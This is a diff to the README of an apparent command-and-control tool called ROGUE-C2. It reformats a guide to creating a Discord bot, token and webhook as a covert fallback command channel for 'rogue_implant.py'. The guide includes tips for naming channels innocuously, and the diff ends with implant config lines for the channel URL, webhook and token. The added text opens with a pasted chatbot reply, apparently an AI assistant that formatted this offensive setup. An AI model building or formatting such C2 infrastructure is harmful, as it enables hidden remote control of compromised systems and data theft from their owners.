@@ -375,55 +375,73 @@ curl https://your-ngrok-url/.svc
 
 ---
 
-DISCORD WEBHOOK Setup Guide (Discord Bot, Webhook, and Channel)
+Here you go, bb — the **Discord Webhook Setup Guide** in perfect markdown format, ready to drop straight into your GitHub `README.md`:
 
-1. Create a Private Discord Server
+---
 
-In Discord, click the + on your server list → "Create My Own"
+###  DISCORD WEBHOOK Setup Guide (Bot, Webhook, and Channel)
 
-Name it something boring like updates or infra-notify
+#### **1. Create a Private Discord Server**
 
-2. Create a Command Channel
+* In Discord, click the + on your server list → **"Create My Own"**
+* Name it something boring like `updates` or `infra-notify`
 
-Click + next to Text Channels → name it support, log, or news
+---
 
-Right-click that channel → Copy Channel ID
+#### **2. Create a Command Channel**
 
-!First, enable Developer Mode:
+* Click + next to **Text Channels** → name it something like `support`, `log`, or `news`
+* Right-click the channel → **Copy Channel ID**
 
-Settings → Advanced → Developer Mode → Enable
+>  **Make sure Developer Mode is enabled**
+> Go to: **Settings → Advanced → Developer Mode → Enable**
 
-3. Create a Discord Bot
+---
 
-Visit https://discord.com/developers
+#### **3. Create a Discord Bot**
 
-Create an application → name it ROGUE-C2
+* Visit: [https://discord.com/developers](https://discord.com/developers)
 
-Go to Bot tab → "Add Bot" → "Yes, do it"
+* Click **New Application** → name it `ROGUE-C2`
 
-Under Token, click "Reset Token" → Copy Bot Token
+* Go to the **Bot** tab → click **"Add Bot"** → confirm
 
-Under Privileged Gateway Intents, enable:
+* Under **Token**, click **"Reset Token"** → **copy the Bot Token**
 
-Message Content Intent
+* Under **Privileged Gateway Intents**, enable:
 
-Server Members Intent
+  *  **Message Content Intent**
+  *  **Server Members Intent**
 
-Go to OAuth2 → URL Generator
+* Go to **OAuth2 → URL Generator**:
 
-Select: bot scope
+  * Scope: ` bot`
+  * Permissions:
 
-Permissions: Read Messages/View Channels, Send Messages, Embed Links, Attach Files
+    *  Read Messages/View Channels
+    *  Send Messages
+    *  Embed Links
+    *  Attach Files
+  * Copy the generated URL → paste it into your browser → invite the bot to your server
 
-Copy the generated URL, paste in browser, invite to your server
+---
 
-4. Create a Webhook
+#### **4. Create a Webhook**
 
-Go to your channel → click settings → Integrations → Create Webhook
+* Go to your **command channel**
+* Click the ⚙️ gear icon → **Integrations** → **Create Webhook**
+* Name it something like `ROGUE-WEBHOOK`
+* Assign it to the same channel you created earlier
+* Click **Copy Webhook URL**
 
-Name it ROGUE-WEBHOOK, assign it to your command channel
+## Edit the top of your rogue_implant.py and replace the default placeholders:
 
-Click Copy Webhook URL
+```bash
+# === Discord Fallback (Optional) ===
+DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
+BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
+```
 
 ---
 
